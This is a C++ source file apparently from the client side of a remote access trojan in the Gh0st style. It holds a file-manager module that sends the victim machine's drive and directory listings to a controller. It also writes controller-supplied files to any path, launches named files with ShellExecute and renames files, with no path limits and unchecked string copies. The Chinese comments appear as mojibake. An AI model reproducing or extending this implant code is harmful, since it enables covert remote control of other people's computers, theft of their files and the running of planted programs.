// FileManager.cpp: implementation of the CFileManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "FileManager.h"
#include "Common.h"
#include <Shellapi.h>
#include <IOSTREAM>
using namespace std;
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CFileManager::CFileManager(IOCPClient* ClientObject):CManager(ClientObject)
{

	m_ulTransferMode = TRANSFER_MODE_NORMAL;

	SendDiskDriverList();
}


ULONG CFileManager::SendDiskDriverList()              //��ñ��ض˵Ĵ�����Ϣ
{
	char	szDiskDriverString[0x500] = {0};
	// ǰһ���ֽ�Ϊ��Ϣ���ͣ������52�ֽ�Ϊ���������������
	BYTE	szBuffer[0x1000] = {0};
	char	szFileSystem[MAX_PATH] = {0};
	char	*Travel = NULL;
	szBuffer[0] = TOKEN_DRIVE_LIST;            // �������б�
	GetLogicalDriveStrings(sizeof(szDiskDriverString), szDiskDriverString);
	
	//�����������Ϣ
	//0018F460  43 3A 5C 00 44 3A 5C 00 45 3A 5C 00 46 3A  C:\.D:\.E:\.F:
    //0018F46E  5C 00 47 3A 5C 00 48 3A 5C 00 4A 3A 5C 00  \.G:\.H:\.J:\.
	
	
	Travel = szDiskDriverString;
	
	unsigned __int64	ulHardDiskAmount = 0;   //HardDisk
	unsigned __int64	ulHardDiskFreeSpace = 0;
	unsigned long		ulHardDiskAmountMB = 0; // �ܴ�С
	unsigned long		ulHardDiskFreeMB = 0;   // ʣ��ռ�
	
	
	//�����������Ϣ
	//0018F460  43 3A 5C 00 44 3A 5C 00 45 3A 5C 00 46 3A  C:\.D:\.E:\.F:
    //0018F46E  5C 00 47 3A 5C 00 48 3A 5C 00 4A 3A 5C 00  \.G:\.H:\.J:\. \0
	
	
	//ע�������dwOffset���ܴ�0 ��Ϊ0��λ�洢������Ϣ����
	for (DWORD dwOffset = 1; *Travel != '\0'; Travel += lstrlen(Travel) + 1)   //�����+1Ϊ�˹�\0
	{
		memset(szFileSystem, 0, sizeof(szFileSystem));
		
		// �õ��ļ�ϵͳ��Ϣ����С
		GetVolumeInformation(Travel, NULL, 0, NULL, NULL, NULL, szFileSystem, MAX_PATH);
		ULONG	ulFileSystemLength = lstrlen(szFileSystem) + 1;    


		SHFILEINFO	sfi;
		SHGetFileInfo(Travel,FILE_ATTRIBUTE_NORMAL,&sfi,
			sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
		
		ULONG ulDiskTypeNameLength = lstrlen(sfi.szTypeName) + 1;  
	
		


		// ������̴�С
		if (Travel[0] != 'A' && Travel[0] != 'B'     
			&& GetDiskFreeSpaceEx(Travel, (PULARGE_INTEGER)&ulHardDiskFreeSpace, 
			(PULARGE_INTEGER)&ulHardDiskAmount, NULL))
		{	
			ulHardDiskAmountMB = ulHardDiskAmount / 1024 / 1024;         //���������ֽ�Ҫת����G
			ulHardDiskFreeMB = ulHardDiskFreeSpace / 1024 / 1024;
		}
		else
		{
			ulHardDiskAmountMB = 0;
			ulHardDiskFreeMB = 0;
		}
		// ��ʼ��ֵ
		
		
		szBuffer[dwOffset] = Travel[0];                     //�̷�
		szBuffer[dwOffset + 1] = GetDriveType(Travel);      //������������
		
		
		
		// ���̿ռ�����ռȥ��8�ֽ�
		memcpy(szBuffer + dwOffset + 2, &ulHardDiskAmountMB, sizeof(unsigned long));
		memcpy(szBuffer + dwOffset + 6, &ulHardDiskFreeMB, sizeof(unsigned long));
		
		// ���̾��������������
		memcpy(szBuffer + dwOffset + 10, sfi.szTypeName, ulDiskTypeNameLength);
		memcpy(szBuffer + dwOffset + 10 + ulDiskTypeNameLength, szFileSystem, 
			ulFileSystemLength);
		
		dwOffset += 10 + ulDiskTypeNameLength + ulFileSystemLength;
	}
	
	
	return 	m_ClientObject->OnServerSending((char*)szBuffer, dwOffset);
}




CFileManager::~CFileManager()
{

	cout<<"Զ���ļ�����"<<endl;
}

VOID CFileManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
{
	switch(szBuffer[0])
	{
	case COMMAND_LIST_FILES:
		{
			SendFilesList((char*)szBuffer + 1);   //��һ���ֽ�����Ϣ �������·��
			break;
		}

	case COMMAND_FILE_SIZE:
		{

			CreateClientRecvFile(szBuffer + 1);
			break;
		}

	case COMMAND_FILE_DATA:
		{

		
			WriteClientRecvFile(szBuffer + 1, ulLength-1);
			break;
		}
	case COMMAND_SET_TRANSFER_MODE:
		{

			SetTransferMode(szBuffer + 1);
		
			break;
		}

	case COMMAND_OPEN_FILE_SHOW:
		{
	        ShellExecute(NULL, "open", (char*)(szBuffer + 1), NULL, NULL, SW_SHOW);   //CreateProcess 
			break;
		}

	case COMMAND_RENAME_FILE:
		{


			szBuffer+=1;
			char* szExistingFileFullPath = NULL;
			char* szNewFileFullPath   = NULL;
			 szNewFileFullPath = szExistingFileFullPath = (char*)szBuffer;

			szNewFileFullPath += strlen((char*)szNewFileFullPath)+1;

			Rename(szExistingFileFullPath,szNewFileFullPath);


			break;
		}
	}
}


//dkfj  C:\1.txt\0  D:\3.txt\0
VOID  CFileManager::Rename(char* szExistingFileFullPath,char* szNewFileFullPath)
{
	MoveFile(szExistingFileFullPath, szNewFileFullPath);
}


VOID CFileManager::SetTransferMode(LPBYTE szBuffer)
{
	memcpy(&m_ulTransferMode, szBuffer, sizeof(m_ulTransferMode));
	GetFileData();
}


//�����ļ���С
VOID CFileManager::CreateClientRecvFile(LPBYTE szBuffer)    
{
	
	//	//[Flag 0001 0001 E:\1.txt\0 ]
	FILE_SIZE*	FileSize = (FILE_SIZE*)szBuffer;
	// ���浱ǰ���ڲ������ļ���
	memset(m_szOperatingFileName, 0, 
		sizeof(m_szOperatingFileName));
	strcpy(m_szOperatingFileName, (char *)szBuffer + 8);  //�Ѿ�Խ����Ϣͷ��
	
	// �����ļ�����
	m_OperatingFileLength = 
		(FileSize->dwSizeHigh * (MAXDWORD + 1)) + FileSize->dwSizeLow;
	
	// �������Ŀ¼
	MakeSureDirectoryPathExists(m_szOperatingFileName);
	
	
	WIN32_FIND_DATA wfa;
	HANDLE hFind = FindFirstFile(m_szOperatingFileName, &wfa);
	

	//1 2 3         1  2 3
	if (hFind != INVALID_HANDLE_VALUE
		&& m_ulTransferMode != TRANSFER_MODE_OVERWRITE_ALL 
		&& m_ulTransferMode != TRANSFER_MODE_JUMP_ALL
		)
	{
		//SendToken(TOKEN_GET_TRANSFER_MODE); //�������ͬ���ļ�

		BYTE	bToken[1];
		bToken[0] = TOKEN_GET_TRANSFER_MODE;
	    m_ClientObject->OnServerSending((char*)&bToken, sizeof(bToken));
	}
	else
	{
		GetFileData();                      //���û����ͬ���ļ��ͻ�ִ�е�����
	}
	FindClose(hFind);
}



VOID CFileManager::WriteClientRecvFile(LPBYTE szBuffer, ULONG ulLength)
{
	BYTE	*Travel;
	DWORD	dwNumberOfBytesToWrite = 0;
	DWORD	dwNumberOfBytesWirte   = 0;
	int		nHeadLength = 9; // 1 + 4 + 4  ���ݰ�ͷ����С��Ϊ�̶���9
	FILE_SIZE	*FileSize;
	// �õ����ݵ�ƫ��
	Travel = szBuffer + 8;
	
	FileSize = (FILE_SIZE *)szBuffer;
	
	// �õ��������ļ��е�ƫ��
	
	LONG	dwOffsetHigh = FileSize->dwSizeHigh;
	LONG	dwOffsetLow = FileSize->dwSizeLow;
	
	
	dwNumberOfBytesToWrite = ulLength - 8;
	
	HANDLE	hFile = 
		CreateFile
		(
		m_szOperatingFileName,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0
		);
	
	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);
	
	int iRet = 0;
	// д���ļ�
	iRet = WriteFile
		(
		hFile,
		Travel, 
		dwNumberOfBytesToWrite, 
		&dwNumberOfBytesWirte,
		NULL
		);
	
	CloseHandle(hFile);	
	BYTE	bToken[9];
	bToken[0] = TOKEN_DATA_CONTINUE;//TOKEN_DATA_CONTINUE
	dwOffsetLow += dwNumberOfBytesWirte;    //
	memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));
	m_ClientObject->OnServerSending((char*)&bToken, sizeof(bToken));
}


BOOL CFileManager::MakeSureDirectoryPathExists(char* szDirectoryFullPath)   
{

	char* szTravel = NULL;
	char* szBuffer = NULL;
	DWORD dwAttributes;
	__try
	{
		szBuffer = (char*)malloc(sizeof(char)*(strlen(szDirectoryFullPath) + 1));

		if(szBuffer == NULL)
		{
			return FALSE;
		}

		strcpy(szBuffer, szDirectoryFullPath);

		szTravel = szBuffer;

	
		/*if((*p == TEXT('\\')) && (*(p+1) == TEXT('\\')))    //??
		{
			p++;          
			p++;           

			while(*p && *p != TEXT('\\'))
			{
				p = CharNext(p);
			}

			if(*p)
			{
				p++;
			}

			while(*p && *p != TEXT('\\'))
			{
				p = CharNext(p);
			}

			if(*p)
			{
				p++;
			}

		}*/
		if (0)
		{
		}
		else if(*(szTravel+1) == ':') 
		{
			szTravel++;
			szTravel++;
			if(*szTravel && (*szTravel == '\\'))
			{
				szTravel++;
			}
		}

		while(*szTravel)           //\Hello\World\Shit\0
		{
			if(*szTravel == '\\')
			{
				*szTravel = '\0';
				dwAttributes = GetFileAttributes(szBuffer);   //�鿴�Ƿ��Ƿ�Ŀ¼  Ŀ¼������
				if(dwAttributes == 0xffffffff)
				{
					if(!CreateDirectory(szBuffer, NULL))
					{
						if(GetLastError() != ERROR_ALREADY_EXISTS)
						{
							free(szBuffer);
							return FALSE;
						}
					}
				}
				else
				{
					if((dwAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
					{
						free(szBuffer);
						szBuffer = NULL;
						return FALSE;
					}
				}

				*szTravel = '\\';
			}

			szTravel = CharNext(szTravel);
		}
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		if (szBuffer!=NULL)
		{
			free(szBuffer);

			szBuffer = NULL;
		}
	
		return FALSE;
	}

	if (szBuffer!=NULL)
	{
		free(szBuffer);
		szBuffer = NULL;
	}
	return TRUE;
}



ULONG CFileManager::SendFilesList(char* szDirectoryPath)
{
	// ���ô��䷽ʽ
    m_ulTransferMode = TRANSFER_MODE_NORMAL;	
	ULONG	ulRet = 0;
	DWORD	dwOffset = 0; // λ��ָ��

	char	*szBuffer = NULL;
	ULONG	ulLength  =  1024 * 10; // �ȷ���10K�Ļ�����

	szBuffer =  (char*)LocalAlloc(LPTR, ulLength);
	if (szBuffer==NULL)
	{
		return 0;
	}


	char szDirectoryFullPath[MAX_PATH];
	
	wsprintf(szDirectoryFullPath, "%s\\*.*", szDirectoryPath);   
	
	
	//szDirectoryFullPath = D:\\*.*
	
	HANDLE hFile = INVALID_HANDLE_VALUE;
	WIN32_FIND_DATA	wfd;
	hFile = FindFirstFile(szDirectoryFullPath, &wfd);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		BYTE bToken = TOKEN_FILE_LIST;

		if (szBuffer!=NULL)
		{
		
			LocalFree(szBuffer);
			szBuffer = NULL;
		}
		return m_ClientObject->OnServerSending((char*)&bToken, 1);           //·������

	}
	
	szBuffer[0] = TOKEN_FILE_LIST;
	
	// 1 Ϊ���ݰ�ͷ����ռ�ֽ�,���ֵ
	dwOffset = 1;
	/*
	�ļ�����	1
	�ļ���		strlen(filename) + 1 ('\0')
	�ļ���С	4
	*/
	do 
	{
		// ��̬��չ������
		if (dwOffset > (ulLength - MAX_PATH * 2))
		{
			ulLength += MAX_PATH * 2;
			szBuffer = (char*)LocalReAlloc(szBuffer, 
				ulLength, LMEM_ZEROINIT|LMEM_MOVEABLE);
		}
		char* szFileName = wfd.cFileName;
		if (strcmp(szFileName, ".") == 0 || strcmp(szFileName, "..") == 0)
			continue;
		// �ļ����� 1 �ֽ�

		//[Flag 1 HelloWorld\0��С ��С ʱ�� ʱ�� 
		//      0 1.txt\0 ��С ��С ʱ�� ʱ��]
		*(szBuffer + dwOffset) = wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY;
		dwOffset++;
		// �ļ��� lstrlen(pszFileName) + 1 �ֽ�
		ULONG ulFileNameLength = strlen(szFileName);
		memcpy(szBuffer + dwOffset, szFileName, ulFileNameLength);
		dwOffset += ulFileNameLength;
		*(szBuffer + dwOffset) = 0;
		dwOffset++;
		
		// �ļ���С 8 �ֽ�
		memcpy(szBuffer + dwOffset, &wfd.nFileSizeHigh, sizeof(DWORD));
		memcpy(szBuffer + dwOffset + 4, &wfd.nFileSizeLow, sizeof(DWORD));
		dwOffset += 8;
		// ������ʱ�� 8 �ֽ�
		memcpy(szBuffer + dwOffset, &wfd.ftLastWriteTime, sizeof(FILETIME));
		dwOffset += 8;
	} while(FindNextFile(hFile, &wfd));

	ulRet = m_ClientObject->OnServerSending(szBuffer, dwOffset);

	LocalFree(szBuffer);
	FindClose(hFile);
	return ulRet;
}



VOID CFileManager::GetFileData()           
{
	int	nTransferMode;
	switch (m_ulTransferMode)   //���û����ͬ�������ǲ������Case�е�
	{
	case TRANSFER_MODE_OVERWRITE_ALL:
		nTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case TRANSFER_MODE_JUMP_ALL:
		nTransferMode = TRANSFER_MODE_JUMP;   //CreateFile��always open����eixt��
		break;
	default:
		nTransferMode = m_ulTransferMode;   //1.  2 3
	}
	
	WIN32_FIND_DATA wfa;
	HANDLE hFind = FindFirstFile(m_szOperatingFileName, &wfa);
	
	//1�ֽ�Token,���ֽ�ƫ�Ƹ���λ�����ֽ�ƫ�Ƶ���λ
	BYTE	bToken[9];
	DWORD	dwCreationDisposition; // �ļ��򿪷�ʽ 
	memset(bToken, 0, sizeof(bToken));
	bToken[0] = TOKEN_DATA_CONTINUE;
	// �ļ��Ѿ�����
	if (hFind != INVALID_HANDLE_VALUE)
	{
		
		// ����
		if (nTransferMode == TRANSFER_MODE_OVERWRITE)
		{
			//ƫ����0
			memset(bToken + 1, 0, 8);//0000 0000
			// ���´���
			dwCreationDisposition = CREATE_ALWAYS;    //���и���
			
		}
		// ������һ��
		else if(nTransferMode == TRANSFER_MODE_JUMP)
		{
			DWORD dwOffset = -1;  //0000 -1
			memcpy(bToken + 5, &dwOffset, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
	}
	else
	{
		
		memset(bToken + 1, 0, 8);  //0000 0000              //û����ͬ���ļ����ߵ�����
		// ���´���
		dwCreationDisposition = CREATE_ALWAYS;    //����һ���µ��ļ�
	}
	FindClose(hFind);
	
	HANDLE	hFile = 
		CreateFile
		(
		m_szOperatingFileName, 
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		dwCreationDisposition,  //
		FILE_ATTRIBUTE_NORMAL,
		0
		);
	// ��Ҫ������
	if (hFile == INVALID_HANDLE_VALUE)
	{
		m_OperatingFileLength = 0;
		return;
	}
	CloseHandle(hFile);
	
	m_ClientObject->OnServerSending((char*)&bToken, sizeof(bToken));
}
